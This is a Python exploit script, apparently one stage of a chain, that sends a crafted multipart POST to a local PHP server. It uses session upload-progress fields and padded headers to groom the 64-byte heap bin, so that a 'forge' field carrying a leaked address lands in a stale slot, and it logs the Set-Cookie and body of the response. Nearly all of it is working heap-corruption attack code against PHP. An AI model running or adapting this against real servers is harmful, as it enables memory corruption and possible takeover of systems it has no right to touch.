#!/usr/bin/env python3
"""B: PHPSESSID/progress parts, then a forge part whose first two headers have
39-byte values (64B live smart_strings in the part header llist). Those claim
slot0/1 of the first 64B bin page; the forge field's 63-byte value raw buffer
(64B) takes slot2 = stale id.
usage: b_forge64_hdr.py LEAK [MARK]
"""
import socket,sys,struct
LEAK=int(sys.argv[1],0); MARK=sys.argv[2] if len(sys.argv)>2 else 'M'
BND=b'B'*10
o=bytearray()
def part(headers,data):
    global o
    o+=b'--'+BND+b'\r\n'+headers+b'\r\n\r\n'+data+b'\r\n'
part(b'Content-Disposition: form-data; name="PHPSESSID"', b'attacksessionid0001')
part(b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b'pwn')
v=bytearray(b'A'*63); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x18+len(MARK)]=MARK.encode()
h=(b'X-A: '+b'q'*39+b'\r\nX-B: '+b'q'*39+b'\r\n'
   b'Content-Disposition: form-data; name="forge"')
part(h, bytes(v))
o+=b'--'+BND+b'--\r\n'
req=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<200000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:120].decode('latin1','replace'))
print('BODY',rest[:100].decode('latin1','replace'))
open('/tmp/b_forge64_hdr.resp','wb').write(data)
